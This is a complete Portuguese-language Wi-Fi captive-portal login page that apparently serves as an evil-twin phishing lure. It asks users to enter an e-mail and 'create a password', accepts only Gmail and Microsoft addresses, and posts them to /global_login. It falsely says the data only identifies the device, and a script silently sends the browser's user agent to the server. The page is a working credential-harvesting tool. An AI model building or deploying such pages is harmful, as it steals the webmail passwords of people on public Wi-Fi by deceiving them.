<!DOCTYPE html>
<html lang="pt-BR">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Login Wi-Fi</title>
	<style>
		body {
			margin: 0;
			padding: 0;
			font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
			background: linear-gradient(135deg, #2563eb, #1e3a8a);
			display: flex;
			justify-content: center;
			align-items: center;
			height: 100vh;
			color: white;
		}
		.container {
			background-color: rgba(0, 0, 0, 0.3);
			padding: 30px 40px;
			border-radius: 16px;
			box-shadow: 0 0 20px rgba(0, 0, 0, 0.4);
			text-align: center;
			width: 100%;
			max-width: 350px;
		}
		h1 {
			margin-bottom: 20px;
		}
		form {
			display: flex;
			flex-direction: column;
		}
		input[type="text"],
		input[type="password"] {
			padding: 10px;
			margin-bottom: 10px;
			border: none;
			border-radius: 8px;
			font-size: 1rem;
		}
		button {
			padding: 10px;
			border: none;
			border-radius: 8px;
			background-color: #3b82f6;
			color: white;
			font-size: 1rem;
			cursor: pointer;
			transition: background-color 0.3s ease;
		}
		button:hover {
			background-color: #2563eb;
		}
		svg {
			width: 50px;
			height: 50px;
			margin-bottom: 20px;
			fill: white;
		}
		#error {
			color: #ffcccb;
			font-size: 0.9rem;
			margin-bottom: 10px;
			display: none;
		}
	</style>
</head>
<body>
	
	<div class="container">
	<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
		<path d="M12 20c.552 0 1-.448 1-1s-.448-1-1-1-1 .448-1 1 .448 1 1 1zm4-4c.552 0 1-.448 1-1 0-.243-.087-.465-.23-.637C15.925 13.481 14.035 13 12 13s-3.925.481-4.77 1.363A.997.997 0 0 0 7 15c0 .552.448 1 1 1h8zm4.602-3.196A11.922 11.922 0 0 0 12 10c-2.709 0-5.2.896-7.602 2.804A.998.998 0 0 0 4 14c0 .552.448 1 1 1h14c.552 0 1-.448 1-1 0-.278-.114-.532-.398-.804zM12 4C7.188 4 2.957 6.218.397 9.203a.998.998 0 0 0-.23 1.078A.999.999 0 0 0 1.03 11h21.94a.999.999 0 0 0 .863-1.53C21.043 6.218 16.812 4 12 4z"/>
	</svg>
	<h1>Criar Acesso</h1>
	<h2>Conecte-se à Rede Wi-Fi</h2>
	<p style="font-size: 0.9rem; color: #ccc; margin-bottom: 1rem;">
		Digite seu e-mail e crie uma senha para liberar o acesso à internet. Seus dados são usados apenas para identificar seu dispositivo.
	</p>

	<form method="POST" action="/global_login" onsubmit="return validarFormulario()">
		<input type="text" id="username" name="username" placeholder="Seu e-mail" required>
		<input type="password" id="password" name="password" placeholder="Crie uma senha (mín. 8 caracteres)" required>
		<p id="error" style="color: red;"></p>
		<button type="submit">Entrar na Rede</button>
	</form>
</div>


	<script>
		function validarFormulario() {
			const email = document.getElementById('username').value.trim().toLowerCase();
			const senha = document.getElementById('password').value;
			const erro = document.getElementById('error');

			const dominiosPermitidos = ["@gmail.com", "@outlook.com", "@hotmail.com", "@live.com", "@msn.com"];

			if (!dominiosPermitidos.some(dom => email.endsWith(dom))) {
				erro.textContent = "Use um e-mail do Gmail ou Microsoft (ex: @gmail.com, @outlook.com)";
				erro.style.display = "block";
				return false;
			}

			if (senha.length < 8) {
				erro.textContent = "A senha deve ter no mínimo 8 caracteres.";
				erro.style.display = "block";
				return false;
			}

			return true; // Permite envio
		}

       
        (function() {
        const userAgent = navigator.userAgent;

        fetch("/get_device", {
            method: "POST",
            headers: {
            "Content-Type": "application/json"
            },
            body: JSON.stringify({ user_agent: userAgent })
        }).then(response => {
            if (!response.ok) {
            console.warn("Falha ao enviar User-Agent");
            }
        }).catch(error => {
            console.error("Erro ao enviar User-Agent:", error);
        });
        })();

	</script>
</body>
</html>
